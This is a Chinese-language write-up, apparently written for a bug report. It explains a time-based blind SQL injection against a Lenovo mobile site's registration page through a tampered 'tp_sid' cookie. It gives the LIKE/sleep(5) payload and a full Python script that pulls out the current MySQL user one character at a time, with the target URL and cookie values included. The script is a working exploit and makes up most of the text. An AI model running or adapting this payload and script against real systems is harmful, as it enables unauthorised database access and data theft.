**0x01 分析**

  

提交漏洞只需要证明能跑出数据就行了

那就来构造一下注入语句吧

MySQL有一个模糊搜索的功能 就是like语句

![](../Images/365862749eb293631cf4815ba719413c.png)

  

%的意思就是以前面的字符串为开头

利用like语句可以构造出 跑当前用户的语句

EWe'%2b(select\*from(select if(user() like '某字符%',sleep(5),0)a)%2b'

  

匹配到一个字符后就开始匹配下一位

我的思路是

  

Step0:定义一段字符串 存下所有的可见字符Step1:定义一个为空的user变量

Step2:将user连接一个字符再连接'%'带入Cookies中

Step3:请求判断时间是否超过5秒 是的话将当前字符连接到user变量中

Step4:循环执行直到匹配不出数据为止

  

  

**0x02 脚本编写**

#!/usr/bin/env python  
\# -\*- coding: utf-8 -\*-  
import requests  
import time  
   
payloads = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@\_.'    #匹配用的字符串  
   
user=''    #存匹配到的字符的字符串  
print 'Start to retrive current user:'  
for i in range(1,23):    #数据长度 这里我偷了下懒 没有先获取长度  
        for payload in payloads:    #遍历取出字符  
                startTime=time.time()  
                url = r'http://xxxxx.lenovomobile.com/?lenovo/regist.html=&username=&email=&submit=%E6%8F%90%E4%BA%A4%E8%B5%84%E6%96%99'    #url  
                cookies = {  
                        'first\_sourceid':r"223.202.62.227",  
                        'first\_domain':r"223.202.62.227",  
                        'ln\_v':r"vid%3D%3E157dd50b5eb5808%7C%7C%7Cfsts%3D%3E1476886836710%7C%7C%7Cdsfs%3D%3E17077%7C%7C%7Cnps%3D%3E7",  
                        'tp\_sid':r"EWeFPJ'%2b(select\*from(select if(user() like '"+user+payload+r"%',sleep(5),0))a)%2b'",    #连接payload  
                }  
                response=requests.get(url,cookies=cookies)    #发送请求  
                if time.time() - startTime > 5:    #判断是否延时了5秒  
                        user+=payload    #是的话连接进user里 然后退出当前这一层的循环  
                        print 'user is:'+user  
                        break  
print '\\n\[Done\] current user is %s' %user    #匹配不出数据后 打印user变量
